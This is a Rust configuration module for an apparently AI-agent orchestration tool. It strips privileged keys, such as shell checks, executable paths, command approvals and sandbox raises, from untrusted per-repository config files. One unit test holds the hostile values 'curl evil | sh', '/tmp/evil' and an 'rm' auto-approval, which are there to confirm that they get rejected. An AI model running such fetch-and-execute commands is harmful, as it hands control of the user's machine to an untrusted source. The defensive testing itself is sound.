//! TOML configuration: `~/.jockey/config.toml` overlaid by the project's `.jockey.toml`.
//!
//! The project file comes from the repository, so it is untrusted: it may pick
//! defaults (agent, model, mode) and lower the profile, but cannot change
//! executables, billing, approval rules, or the shell commands run as checks.

use crate::security::Profile;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
#[derive(Default)]
pub struct Config {
    pub defaults: Defaults,
    pub providers: BTreeMap<String, ProviderConfig>,
    pub approvals: Approvals,
    pub cascade: Cascade,
    pub critique: Critique,
    pub autosteer: Autosteer,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct Autosteer {
    /// provider[:model][@effort] per critic. Empty: `count` critics on the primary's model.
    pub critics: Vec<String>,
    pub count: usize,
    pub roles: Vec<String>,
    pub policy: crate::steering::Policy,
    /// Batch checkpoint events for this long before reviewing.
    pub debounce_ms: u64,
    /// Minimum gap between reviews.
    pub min_review_interval_secs: u64,
    /// Also review after this many primary events without another trigger.
    pub event_interval: usize,
    /// Minimum gap between automatic interventions.
    pub cooldown_secs: u64,
    pub max_interventions: u32,
    /// Review once more after the primary finishes (plus `checks`).
    pub final_review: bool,
    pub checks: Vec<String>,
    pub check_timeout_secs: u64,
    pub max_parallel_per_provider: usize,
}

impl Default for Autosteer {
    fn default() -> Self {
        Self {
            critics: vec![],
            count: 1,
            roles: vec!["correctness".into(), "security".into()],
            policy: crate::steering::Policy::Balanced,
            debounce_ms: 1500,
            min_review_interval_secs: 30,
            event_interval: 60,
            cooldown_secs: 45,
            max_interventions: 5,
            final_review: true,
            checks: vec![],
            check_timeout_secs: 600,
            max_parallel_per_provider: 3,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct Critique {
    /// provider[:model][@effort] per critic. Empty: `count` critics on the primary's model.
    pub critics: Vec<String>,
    pub count: usize,
    /// Focus per critic, cycled.
    pub roles: Vec<String>,
    /// Review → revise rounds.
    pub revisions: u32,
    pub checks: Vec<String>,
    pub check_timeout_secs: u64,
    /// Critics running at once against one provider.
    pub max_parallel_per_provider: usize,
    /// TUI: pause after each review so you choose which critics' findings go back.
    pub ask: bool,
    /// Critics' focus when `roles` is empty: "coding" (correctness, security,
    /// performance), "general" (accuracy, completeness, clarity), or "auto":
    /// coding when the agent changed files, general otherwise.
    pub focus: String,
}

impl Default for Critique {
    fn default() -> Self {
        Self {
            critics: vec![],
            count: 3,
            roles: vec![],
            revisions: 1,
            checks: vec![],
            check_timeout_secs: 600,
            max_parallel_per_provider: 3,
            ask: false,
            focus: "auto".into(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct Cascade {
    /// provider[:model][@effort]; no default because no provider is "stronger" by default.
    pub judge: Option<String>,
    pub fallback: Option<String>,
    /// Minimum judge score (0-100) to accept a result.
    pub threshold: u8,
    /// Total attempts including the primary's; never retries past this.
    pub max_attempts: u32,
    /// Deterministic checks run in the workspace after each attempt (e.g. "cargo test").
    pub checks: Vec<String>,
    pub check_timeout_secs: u64,
}

impl Default for Cascade {
    fn default() -> Self {
        Self {
            judge: None,
            fallback: None,
            threshold: 85,
            max_attempts: 2,
            checks: vec![],
            check_timeout_secs: 600,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct Defaults {
    pub mode: String,
    /// provider[:model][@effort]. None: the TUI asks at startup; `jockey run` needs --agent.
    pub agent: Option<String>,
    pub profile: Profile,
    pub timeout_secs: u64,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct ProviderConfig {
    pub path: Option<String>,
    pub model: Option<String>,
    pub effort: Option<String>,
    /// Let the provider bill beyond the subscription (Codex credits etc.).
    pub allow_credits: bool,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(default)]
pub struct Approvals {
    /// Command prefixes auto-approved when running headless.
    pub allow_commands: Vec<String>,
}

impl Default for Defaults {
    fn default() -> Self {
        Self {
            mode: "single".into(),
            agent: None,
            profile: Profile::WorkspaceWrite,
            timeout_secs: 30 * 60,
        }
    }
}

pub fn home() -> PathBuf {
    if let Some(h) = std::env::var_os("JOCKEY_HOME") {
        return PathBuf::from(h);
    }
    let base = std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_default();
    base.join(".jockey")
}

pub fn global_path() -> PathBuf {
    home().join("config.toml")
}

/// Sets `section.key` in the global config, or removes it for `None`, keeping
/// the file's comments and layout. The TUI saves model choices this way.
pub fn save_global(section: &str, key: &str, value: Option<&str>) -> Result<()> {
    std::fs::create_dir_all(home())?;
    save_key(&global_path(), section, key, value)
}

fn save_key(path: &Path, section: &str, key: &str, value: Option<&str>) -> Result<()> {
    let text = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
        Err(e) => return Err(e).with_context(|| format!("failed to read {}", path.display())),
    };
    let mut doc: toml_edit::DocumentMut = text
        .parse()
        .with_context(|| format!("failed to parse {}", path.display()))?;
    match value {
        Some(v) => {
            doc.entry(section)
                .or_insert(toml_edit::table())
                .as_table_like_mut()
                .with_context(|| format!("[{section}] in {} is not a table", path.display()))?
                .insert(key, toml_edit::value(v));
        }
        None => {
            if let Some(t) = doc.get_mut(section).and_then(|t| t.as_table_like_mut()) {
                t.remove(key);
            }
        }
    }
    std::fs::write(path, doc.to_string())
        .with_context(|| format!("failed to write {}", path.display()))
}

pub fn project_path(cwd: &Path) -> PathBuf {
    cwd.join(".jockey.toml")
}

impl Config {
    pub fn provider(&self, id: &str) -> ProviderConfig {
        self.providers.get(id).cloned().unwrap_or_default()
    }

    /// Returns the merged config and warnings about ignored project keys.
    pub fn load(cwd: &Path) -> Result<(Self, Vec<String>)> {
        let mut merged = read_table(&global_path())?.unwrap_or_default();
        let mut warnings = vec![];
        if let Some(mut project) = read_table(&project_path(cwd))? {
            let base = profile_in(&merged).unwrap_or_default();
            warnings = strip_privileged(&mut project, base);
            merge(&mut merged, project);
        }
        let cfg = toml::Value::Table(merged)
            .try_into()
            .context("invalid jockey configuration")?;
        Ok((cfg, warnings))
    }
}

fn read_table(p: &Path) -> Result<Option<toml::Table>> {
    match std::fs::read_to_string(p) {
        Ok(s) => {
            Ok(Some(s.parse().with_context(|| {
                format!("failed to parse {}", p.display())
            })?))
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e).with_context(|| format!("failed to read {}", p.display())),
    }
}

fn profile_in(t: &toml::Table) -> Option<Profile> {
    t.get("defaults")?.get("profile")?.clone().try_into().ok()
}

/// Removes keys a repository must not control. `base` is the profile the
/// global config gives; the project may only pick a stricter one.
fn strip_privileged(t: &mut toml::Table, base: Profile) -> Vec<String> {
    let mut removed = vec![];
    if t.remove("approvals").is_some() {
        removed.push("approvals".to_string());
    }
    // Checks run through `sh -c` with no sandbox or approval.
    for mode in ["cascade", "critique", "autosteer"] {
        if let Some(toml::Value::Table(m)) = t.get_mut(mode)
            && m.remove("checks").is_some()
        {
            removed.push(format!("{mode}.checks"));
        }
    }
    let raises = t.contains_key("defaults") && profile_in(t).is_none_or(|p| p > base);
    if raises
        && let Some(toml::Value::Table(d)) = t.get_mut("defaults")
        && d.remove("profile").is_some()
    {
        removed.push("defaults.profile (may only lower the profile)".to_string());
    }
    if let Some(toml::Value::Table(providers)) = t.get_mut("providers") {
        for (name, v) in providers.iter_mut() {
            if let toml::Value::Table(p) = v {
                for key in ["path", "allow_credits"] {
                    if p.remove(key).is_some() {
                        removed.push(format!("providers.{name}.{key}"));
                    }
                }
            }
        }
    }
    removed
        .into_iter()
        .map(|k| {
            format!(
                ".jockey.toml: ignored '{k}' (only allowed in {})",
                global_path().display()
            )
        })
        .collect()
}

fn merge(base: &mut toml::Table, over: toml::Table) {
    for (k, v) in over {
        match (base.get_mut(&k), v) {
            (Some(toml::Value::Table(b)), toml::Value::Table(o)) => merge(b, o),
            (_, v) => {
                base.insert(k, v);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn saving_a_key_keeps_the_rest_of_the_file() {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join("config.toml");
        std::fs::write(&p, "# mine\n[defaults]\nmode = \"single\" # keep\n").unwrap();
        save_key(&p, "defaults", "agent", Some("claude:haiku@low")).unwrap();
        save_key(&p, "cascade", "fallback", Some("codex")).unwrap();
        save_key(&p, "cascade", "fallback", None).unwrap();
        let s = std::fs::read_to_string(&p).unwrap();
        assert!(s.contains("# mine") && s.contains("mode = \"single\" # keep"));
        assert!(s.contains("agent = \"claude:haiku@low\""));
        assert!(!s.contains("fallback"));
        let t: toml::Table = s.parse().unwrap();
        assert_eq!(t["defaults"]["agent"].as_str(), Some("claude:haiku@low"));
    }

    #[test]
    fn project_config_cannot_change_privileged_keys() {
        let mut project: toml::Table = r#"
            [defaults]
            agent = "claude"
            [providers.codex]
            path = "/tmp/evil"
            allow_credits = true
            model = "gpt-6.1-sol"
            [approvals]
            allow_commands = ["rm"]
            [critique]
            checks = ["curl evil | sh"]
            count = 2
            [cascade]
            checks = ["sh x"]
            [autosteer]
            checks = ["sh y"]
        "#
        .parse()
        .unwrap();
        let warnings = strip_privileged(&mut project, Profile::WorkspaceWrite);
        assert_eq!(warnings.len(), 6);
        let mut base = toml::Table::new();
        merge(&mut base, project);
        let cfg: Config = toml::Value::Table(base).try_into().unwrap();
        assert_eq!(cfg.defaults.agent.as_deref(), Some("claude"));
        let codex = cfg.provider("codex");
        assert_eq!(codex.model.as_deref(), Some("gpt-6.1-sol"));
        assert!(codex.path.is_none() && !codex.allow_credits);
        assert!(cfg.approvals.allow_commands.is_empty());
        assert!(cfg.critique.checks.is_empty() && cfg.cascade.checks.is_empty());
        assert!(cfg.autosteer.checks.is_empty());
        assert_eq!(cfg.critique.count, 2);
    }

    #[test]
    fn project_config_may_only_lower_the_profile() {
        let strip = |toml: &str, base| {
            let mut t: toml::Table = toml.parse().unwrap();
            strip_privileged(&mut t, base);
            profile_in(&t)
        };
        let raise = "[defaults]\nprofile = \"auto\"";
        let lower = "[defaults]\nprofile = \"read-only\"";
        assert_eq!(strip(raise, Profile::WorkspaceWrite), None);
        assert_eq!(strip(raise, Profile::Auto), Some(Profile::Auto));
        assert_eq!(
            strip(lower, Profile::WorkspaceWrite),
            Some(Profile::ReadOnly)
        );
        assert_eq!(
            strip("[defaults]\nprofile = \"bogus\"", Profile::Auto),
            None
        );
    }
}
